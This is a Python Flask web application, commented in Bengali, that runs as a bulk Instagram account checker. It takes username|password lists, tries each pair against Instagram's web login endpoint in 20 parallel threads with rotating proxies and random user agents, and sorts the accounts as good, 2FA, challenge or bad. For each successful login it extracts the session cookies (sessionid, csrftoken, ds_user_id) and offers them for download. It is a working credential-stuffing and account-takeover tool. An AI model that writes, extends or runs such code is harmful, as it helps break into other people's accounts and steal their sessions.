from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import asyncio
import aiohttp
import json
import time
import os
import random
from datetime import datetime
import threading
import zipfile
from io import BytesIO
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

app = Flask(__name__)
CORS(app)

jobs = {}

class InstagramProChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies if proxies else []
        self.current_proxy_index = 0
        self.session = self._create_session()
        
    def _create_session(self):
        """রিট্রাই সেশন তৈরি (EOF fix)"""
        session = requests.Session()
        retry = Retry(
            total=3,
            read=3,
            connect=3,
            backoff_factor=0.3,
            status_forcelist=(500, 502, 504)
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def get_next_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def fast_check(self, username, password):
        """সবচেয়ে ফাস্ট চেকিং মেথড (৫-১০ সেকেন্ড)"""
        try:
            proxy = self.get_next_proxy()
            proxy_dict = None
            if proxy:
                proxy_dict = {'http': proxy, 'https': proxy}
            
            # 1. কুকি জেনারেটর API (ফাস্টেস্ট)
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
                    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                ]),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Instagram-AJAX': str(random.randint(1000000, 9999999)),
                'X-CSRFToken': 'missing',
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive'
            }
            
            # ২. সেশন শুরু
            self.session.get('https://www.instagram.com/', headers=headers, proxies=proxy_dict, timeout=5)
            time.sleep(0.5)
            
            # ৩. লগিন রিকোয়েস্ট
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}'
            }
            
            response = self.session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                proxies=proxy_dict,
                timeout=8,
                allow_redirects=False
            )
            
            result = response.json()
            
            # ৪. রেসপন্স পার্স
            if result.get('authenticated'):
                # কুকি বের করা
                cookies = self.session.cookies.get_dict()
                cookie_parts = []
                for key in ['sessionid', 'csrftoken', 'ds_user_id', 'rur']:
                    if key in cookies:
                        cookie_parts.append(f"{key}={cookies[key]}")
                
                return {
                    'status': 'good',
                    'cookie': '; '.join(cookie_parts),
                    'username': username,
                    'type': 'success',
                    'time': 0.5
                }
            
            elif result.get('two_factor_required'):
                return {'status': '2fa', 'username': username, 'type': '2fa', 'error': '2FA Required'}
            
            elif result.get('checkpoint_url'):
                return {'status': 'challenge', 'username': username, 'type': 'challenge', 'error': 'Challenge'}
            
            elif 'invalid' in str(result).lower() or 'password' in str(result).lower():
                return {'status': 'bad', 'username': username, 'type': 'bad', 'error': 'Wrong Password'}
            
            else:
                return {'status': 'error', 'username': username, 'type': 'error', 'error': str(result)[:100]}
                
        except requests.exceptions.Timeout:
            return {'status': 'error', 'username': username, 'type': 'timeout', 'error': 'Timeout'}
        except requests.exceptions.ConnectionError:
            return {'status': 'error', 'username': username, 'type': 'connection', 'error': 'Connection Error'}
        except Exception as e:
            return {'status': 'error', 'username': username, 'type': 'exception', 'error': str(e)[:100]}

def process_worker(cred):
    """থ্রেড পুল ওয়ার্কার (প্যারালাল প্রসেসিং)"""
    if '|' not in cred:
        return None
    username, password = cred.split('|', 1)
    checker = InstagramProChecker()
    return checker.fast_check(username.strip(), password.strip())

def process_batch_parallel(credentials_list, job_id, proxy_list=None):
    """প্যারালাল প্রসেসিং - একসাথে ২০টা"""
    total = len(credentials_list)
    
    jobs[job_id]['progress'] = 0
    jobs[job_id]['status'] = 'processing'
    
    # থ্রেড পুল (প্যারালাল)
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(process_worker, cred) for cred in credentials_list if '|' in cred]
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            try:
                result = future.result(timeout=10)
                if result:
                    if result['status'] == 'good':
                        jobs[job_id]['results']['good'].append(f"{result['username']}|{result.get('cookie', '')}")
                    elif result['status'] == '2fa':
                        jobs[job_id]['results']['2fa'].append(f"{result['username']}|2FA_REQUIRED")
                    elif result['status'] == 'challenge':
                        jobs[job_id]['results']['challenge'].append(f"{result['username']}|CHALLENGE_REQUIRED")
                    elif result['status'] == 'bad':
                        jobs[job_id]['results']['bad'].append(f"{result['username']}|BAD_PASSWORD")
                    else:
                        jobs[job_id]['results']['error'].append(f"{result['username']}|ERROR: {result.get('error', 'Unknown')}")
            except Exception as e:
                if '|' in credentials_list[i]:
                    username = credentials_list[i].split('|', 1)[0]
                    jobs[job_id]['results']['error'].append(f"{username}|ERROR: {str(e)[:50]}")
            
            # প্রোগ্রেস আপডেট (প্রতি রেজাল্ট শেষে)
            jobs[job_id]['progress'] = int((i + 1) / total * 100)
            jobs[job_id]['details'] = {
                'good': len(jobs[job_id]['results']['good']),
                '2fa': len(jobs[job_id]['results']['2fa']),
                'challenge': len(jobs[job_id]['results']['challenge']),
                'bad': len(jobs[job_id]['results']['bad']),
                'error': len(jobs[job_id]['results']['error'])
            }
    
    jobs[job_id]['status'] = 'completed'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        credentials = data.get('credentials', '').strip().split('\n')
        credentials = [c.strip() for c in credentials if c.strip()]
        
        proxy_input = data.get('proxies', '').strip()
        proxy_list = []
        if proxy_input:
            proxy_list = [p.strip() for p in proxy_input.split('\n') if p.strip() and not p.startswith('#')]
        
        if not credentials:
            return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
        
        job_id = datetime.now().strftime("%Y%m%d%H%M%S")
        jobs[job_id] = {
            'status': 'pending',
            'progress': 0,
            'results': {'good': [], '2fa': [], 'challenge': [], 'bad': [], 'error': []},
            'details': {},
            'total': len(credentials),
            'proxy_count': len(proxy_list)
        }
        
        # থ্রেডে চালানো (নন-ব্লকিং)
        thread = threading.Thread(target=process_batch_parallel, args=(credentials, job_id, proxy_list))
        thread.daemon = True
        thread.start()
        
        return jsonify({'job_id': job_id, 'proxy_count': len(proxy_list)})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    return jsonify({
        'status': jobs[job_id]['status'],
        'progress': jobs[job_id]['progress'],
        'details': jobs[job_id].get('details', {}),
        'total': jobs[job_id]['total']
    })

@app.route('/api/download/<job_id>/<type>')
def download(job_id, type):
    try:
        if job_id not in jobs:
            return jsonify({'error': 'Job not found'}), 404
        
        if type == 'all':
            memory_file = BytesIO()
            with zipfile.ZipFile(memory_file, 'w') as zf:
                for category in ['good', '2fa', 'challenge', 'bad', 'error']:
                    results = jobs[job_id]['results'][category]
                    if results:
                        content = '\n'.join(results)
                        zf.writestr(f"{category}_accounts.txt", content)
                
                report = f"""Instagram Checker Report
Job ID: {job_id}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total: {jobs[job_id]['total']}

Results:
✅ Good: {len(jobs[job_id]['results']['good'])}
🔐 2FA: {len(jobs[job_id]['results']['2fa'])}
⚠️ Challenge: {len(jobs[job_id]['results']['challenge'])}
❌ Bad: {len(jobs[job_id]['results']['bad'])}
❗ Error: {len(jobs[job_id]['results']['error'])}
"""
                zf.writestr("report.txt", report)
            
            memory_file.seek(0)
            return send_file(memory_file, download_name=f'all_results_{job_id}.zip', as_attachment=True)
        
        else:
            results = jobs[job_id]['results'][type]
            if not results:
                return jsonify({'error': 'No results'}), 404
            content = '\n'.join(results)
            return send_file(BytesIO(content.encode()), download_name=f'{type}_{job_id}.txt', as_attachment=True)
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
